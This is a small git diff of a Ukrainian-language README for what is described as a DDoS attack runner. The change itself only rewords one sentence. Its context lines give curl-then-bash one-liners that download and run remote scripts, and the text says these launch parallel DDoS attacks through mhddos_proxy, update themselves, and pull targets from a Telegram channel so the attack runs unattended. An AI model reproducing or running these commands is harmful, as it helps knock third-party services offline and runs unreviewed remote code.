@@ -138,4 +138,4 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/proxy_finder/main/auto_ru
 curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 1500 1000
 ```
 Більш детально про всі параметри можна почитати тут: https://github.com/alexnest-ua/runner_for_windows - цей скрипт дозволяє запустити декілька паралельних DDoS-атак через вбудований mhddos_proxy та має вже вбудований proxy_finder, який ще й автоматично оновлює не лише себе, а й mhddos_proxy та proxy_finder, та бере актуальні цілі звідси: https://t.me/ddos_separ  
-Тому можете тут https://github.com/alexnest-ua/runner_for_windows обирати під свій ПК - запускати атаку та йти займатися своїми справами, а скрипт зробить все за вас 
+Тому можете тут https://github.com/alexnest-ua/runner_for_windows обирати параметри під свій ПК - запускати атаку та йти займатися своїми справами, а скрипт зробить все за вас 
